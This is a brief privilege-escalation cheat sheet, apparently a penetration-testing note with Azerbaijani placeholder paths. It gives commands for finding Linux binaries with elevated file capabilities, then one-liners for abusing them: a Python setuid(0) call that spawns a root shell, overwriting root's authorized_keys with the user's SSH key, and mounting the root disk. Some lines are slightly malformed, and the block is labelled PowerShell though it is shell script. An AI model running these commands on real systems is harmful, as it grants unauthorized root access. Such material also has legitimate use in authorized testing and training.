# Capabilities
```powershell
getcap -r / 2>/dev/null | grep --color=always -E 'cap_sys_admin|cap_setuid|cap_setgid|cap_dac_override|cap_sys_ptrace|cap_sys_module|cap_sys_chroot|$'

find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

cap_setuid+ep | cap_setgid+ep
/yol/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

cap_dac_override+ep
/yol/tapılan_fayl cat ~/.ssh/id_rsa.pub > /root/.ssh/authorized_keys
ssh root@localhost

cap_sys_admin+ep
mkdir /tmp/rootfs
/yol/tapılan_fayl mount /dev/sda1 /tmp/rootfs
cd /tmp/rootfs/etc/
```
